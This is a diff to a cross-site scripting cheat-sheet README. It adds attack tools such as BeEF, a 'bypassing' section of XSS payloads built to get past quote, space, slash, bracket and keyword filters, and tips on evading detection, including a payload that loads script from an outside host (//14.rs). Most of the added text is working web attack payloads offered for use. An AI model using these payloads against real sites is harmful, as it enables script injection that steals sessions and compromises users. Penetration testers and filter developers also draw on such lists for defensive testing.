@@ -27,6 +27,8 @@ Put this repo on watch. I will be updating it regularly.
 ### Awesome Tools
 - [XSStrike](http://xsstrike.tk/)
 - [KNOXSS](http://knoxss.me/)
+- [BeEF](https://github.com/beefproject/beef)
+- [JShell](https://github.com/UltimateHackers/JShell)
 
 ### Awesome Context Breaking
 
@@ -111,7 +113,7 @@ If the quotes are not being filtered, you can simply try payloads from **Awesome
 ```
 variable = 'value' or variable = "value"
 ```
-Now lets say single quotes (') are in use, in that case enter **x'd3v**. If it gets altered to **x\'d3v**, try escaping the backslash (\) by adding a backslash to your probe i.e. **x\'d3v**. If it works use the following payload:
+Now lets say single quotes (') are in use, in that case enter **x'd3v**. If it gets altered to **x\\'d3v**, try escaping the backslash (\) by adding a backslash to your probe i.e. **x\\'d3v**. If it works use the following payload:
 ```
 \'-alert()-\'
 ```
@@ -135,15 +137,50 @@ If the your dummy tags lands in the source code as it is, go for any of these pa
 ```
 
 ### Awesome Bypassing
-Come back later
+
+**Note:** None of these payloads use single (') or double quotes (").
+
+- Without event handlers
+```
+<object data=javascript:confirm()>
+<script src=//14.rs>
+<script>confirm()</script>
+```
+- Without space
+```
+<svg/onload=confirm()>
+```
+- Without slash (/)
+```
+<svg onload=confirm()>
+<img src=x onerror=confirm()>
+```
+- Without equal sign (=)
+```
+<script>confirm()</script>
+```
+- Without closing angular bracket (>)
+```
+<svg onload=confirm()//
+```
+- Without alert, confirm, prompt
+```
+<svg onload=co\u006efirm()>
+<svg onload=z=co\u006efir\u006d,z()>
+```
+- Without a Valid HTML tag
+```
+<x onclick=confirm()>click here
+```
 
 ### Awesome Tips & Tricks
 - http(s):// can be shortened to // or /\.
 - **document.cookie** can be shortened to **cookie**. It applies to other DOM objects as well.
-- alert and other pop-up functions don't need a value, so stop doing **alert(1)** and start doing **alert()**
+- alert and other pop-up functions don't need a value, so stop doing **alert('XSS')** and start doing **alert()**
+- You can use **//** to close a tag instead of **>**.
 - I have found that **confirm** is the least detected pop-up function so stop using **alert**.
-- Quotes around attribute value aren't neccessary. You can use **&lt;script src=//14.rs&gt;** instead of **&lt;script src="//14.rs"&glt;**
-- The shortest independent payload is **&lt;embed src=//14.rs&gt;** (19 chars)
+- Quotes around attribute value aren't neccessary as long as it doesn't contain spaces. You can use **&lt;script src=//14.rs&gt;** instead of **&lt;script src="//14.rs"&glt;**
+- The shortest independent "XSS" payload is **&lt;embed src=//14.rs&gt;** (19 chars)
 
 ### Awesome Credits
 All the payloads are crafted by me unless specified.
